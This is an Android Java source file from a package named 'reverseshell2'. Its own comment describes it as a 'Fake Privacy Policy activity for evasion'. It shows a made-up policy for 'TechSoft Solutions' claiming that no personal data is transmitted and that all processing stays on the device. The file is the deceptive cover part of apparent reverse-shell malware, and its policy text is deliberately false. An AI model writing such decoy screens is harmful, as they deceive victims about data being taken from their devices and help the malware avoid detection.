package com.example.reverseshell2;

import android.app.Activity;
import android.os.Bundle;
import android.widget.TextView;

/**
 * Fake Privacy Policy activity for evasion
 */
public class PrivacyPolicyActivity extends Activity {
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        TextView textView = new TextView(this);
        textView.setText("Privacy Policy\n\n" +
                "Last updated: January 2024\n\n" +
                "TechSoft Solutions is committed to protecting your privacy. " +
                "This privacy policy explains how we handle information.\n\n" +
                "Information Collection:\n" +
                "• We collect device performance metrics to improve optimization\n" +
                "• No personal data is transmitted or stored\n" +
                "• All processing happens locally on your device\n\n" +
                "Data Security:\n" +
                "• We use industry-standard encryption\n" +
                "• Data is not shared with third parties\n" +
                "• You can disable data collection in settings\n\n" +
                "Contact us at: privacy@techsoft-solutions.com");
        textView.setPadding(40, 40, 40, 40);
        textView.setTextSize(12);
        
        setContentView(textView);
    }
}